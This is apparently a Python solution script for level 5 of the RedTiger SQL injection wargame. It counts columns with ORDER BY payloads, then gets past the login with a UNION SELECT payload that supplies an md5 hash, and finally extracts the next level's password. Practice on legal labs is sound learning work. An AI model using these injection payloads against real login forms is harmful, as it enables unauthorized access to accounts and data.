#!/usr/bin/env python3
import tiger_cookies
import tigers as tg


def main():
    """
    Target: Bypass the login

    Disabled: substring , substr, ( , ), mid
    Hints: its not a blind, the password is md5-crypted, watch the login errors
    """
    url = "https://redtiger.labs.overthewire.org/level5.php?mode=login"
    finds = "md5('a')"
    pass_r = 'The password for the next level is: '
    level = 'level5login'
    method = 'post'
    inj_param = 'username'
    other_param = {'password': 'a', 'login': 'Login'}

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level5login=cooks[level])

    # Counting the number of columns
    payload = f"' order by %s #"
    p = tg.SqlInjection(url, cook, method, inj_param, payload,
                        check_clear=pass_r, other_param=other_param)
    if not (columns := p.count_columns_order_by()):
        return False

    # Try to auth
    p.payload = "' union select %s #"
    if not (response := p.try_auth(columns, finds)):
        return False

    # Еxtracting data from html
    passw = p.extract_pass(response)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()
